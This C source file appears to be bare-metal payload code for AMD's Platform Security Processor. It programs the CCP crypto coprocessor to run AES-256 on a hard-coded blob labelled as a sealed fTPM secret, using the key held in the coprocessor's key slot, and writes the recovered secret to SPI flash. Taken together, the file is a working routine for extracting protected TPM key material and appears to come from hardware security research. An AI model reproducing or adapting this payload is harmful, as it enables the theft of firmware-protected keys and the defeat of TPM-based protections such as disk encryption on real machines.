#include <stdalign.h>
#include <stdint.h>

#define u8 uint8_t
#define u16 uint16_t
#define u32 uint32_t



#define MAGIC_REG ((volatile u32*) 0x3006000)

void magic_init() {
    *MAGIC_REG = 1;
}



//#define SMN_FLASH_ADDR ((u32) 0xa0)
#define SMN_FLASH_ADDR ((u32) 0x440)
#define SMN_SLOT_CTRL ((volatile u32*) 0x3220000)
#define SMN_SLOT_MAP ((volatile u32*) 0x1000000)

void spi_init() {
    for (u32 i = 0; i < 16; i++)
        SMN_SLOT_CTRL[i] = 0;
    *SMN_SLOT_CTRL = SMN_FLASH_ADDR;
}

void write_words_to_spi(u32 offset, u32* output, u32 count) {
    for (u32 i = 0; i < count; i++)
        SMN_SLOT_MAP[(offset>>2) + i] = *output++;
}



#define CCP_CTRL ((volatile u32*) 0x3001000)
#define CCP_TAIL ((volatile u32*) 0x3001004)
#define CCP_HEAD ((volatile u32*) 0x3001008)
#define CCP_STATUS ((volatile u32*) 0x3001100)

#define SLOT_COUNT 0x100
// lsb address range 0x0 to 0x1000

enum {
    X86_MEM = 0,
    LSB_MEM = 1,
    PSP_MEM = 2,
};

#define AES_BASE ((u32) 0x13)

#define AES_MODE ((u32) 0x3e000)
#define AES_ECB  ((u32) 0x0)

#define AES_DIR     ((u32) 0x1000)
#define AES_DECRYPT ((u32) 0x0000)
#define AES_ENCRYPT ((u32) 0x1000)

#define AES_TYPE ((u32) 0xc0000)
#define AES_128  ((u32) 0x00000)
#define AES_192  ((u32) 0x40000)
#define AES_256  ((u32) 0x80000)

typedef struct {
    u32 low;
    u16 high;
    u16 type;
} ccp_addr;

#define CCP_ADDR_SET_LOCAL(ca, ptr) \
    ca.low = (u32) (ptr); \
    ca.high = 0; \
    ca.type = PSP_MEM
#define CCP_ADDR_SET_LSB(ca, offset) \
    ca.low = (u32) (offset); \
    ca.high = 0; \
    ca.type = LSB_MEM

typedef struct {
    alignas(32) u32 control;
    u32 length;
    ccp_addr src;
    ccp_addr dest;
    ccp_addr key;
} ccp_request;

#define CCP_SRC_SET_LOCAL(cc, ptr) \
    CCP_ADDR_SET_LOCAL(cc.src, ptr)
#define CCP_SRC_SET_LSB(cc, offset) \
    CCP_ADDR_SET_LSB(cc.src, offset)

#define CCP_DEST_SET_LOCAL(cc, ptr) \
    CCP_ADDR_SET_LOCAL(cc.dest, ptr)
#define CCP_DEST_SET_LSB(cc, offset) \
    CCP_ADDR_SET_LSB(cc.dest, offset)

#define CCP_KEY_SET_LOCAL(cc, ptr) \
    CCP_ADDR_SET_LOCAL(cc.key, ptr)
#define CCP_KEY_SET_LSB(cc, offset) \
    CCP_ADDR_SET_LSB(cc.key, offset)

u32 execute_ccp_req(ccp_request* req) {
    *CCP_HEAD = (u32) req;
    *CCP_TAIL = (u32) &req[1];
    //*CCP_CTRL = (((u32) req) << 0x10) | 0x15;
    *CCP_CTRL = 0x17;
    while (0b1 & *CCP_CTRL);
    while (!(0b10 & *CCP_CTRL));
    return *CCP_STATUS & 0b1111111;
}

alignas(32) u8 SEALED_FTPM_SECRET[32] = {
    0x98, 0x2f, 0x8a, 0x42,
    0x91, 0x44, 0x37, 0x71,
    0xcf, 0xfb, 0xc0, 0xb5,
    0xa5, 0xdb, 0xb5, 0xe9,
    0x5b, 0xc2, 0x56, 0x39,
    0xf1, 0x11, 0xf1, 0x59,
    0xa4, 0x82, 0x3f, 0x92,
    0xd5, 0x5e, 0x1c, 0xab
};

alignas(32) u8 OUTPUT[32];

ccp_request AES_REQUEST = {
    //.control = 0x0108101A,
    .control = AES_256 | AES_ENCRYPT | AES_BASE,
    .length = 32,
    .src = { .low = (u32) SEALED_FTPM_SECRET, .high = 0, .type = PSP_MEM },
    .key = { .low = 0, .high = 0, .type = LSB_MEM },
    .dest = { .low = (u32) OUTPUT, .high = 0, .type = PSP_MEM },
};

void copy(u8 * src, u8 * dest, u32 len) {
    for (u32 i = 0; i < len; i++)
        dest[i] = src[i];
}

u32 unseal(u8 * output) {
    u32 rc = execute_ccp_req(&AES_REQUEST);
    if (rc) return rc;
    copy(OUTPUT, output, 32);
    return 0;
}

u32 FAILED = 0xED11FA;

void print_failed(u32 addr, u32 rc) {
    write_words_to_spi(addr, &rc, 1);
    write_words_to_spi(addr + 4, &FAILED, 1);
}

int main () {

    magic_init();
    spi_init();

    // sanity checks
    write_words_to_spi(0x10000, (u32*) "Hello, world!\0\0\0\0", 4);

    u8 secret[32];
    u32 rc = unseal(secret);
    if (rc) print_failed(0, rc);
    else write_words_to_spi(0, (u32*) secret, 8);

    return 0;
}



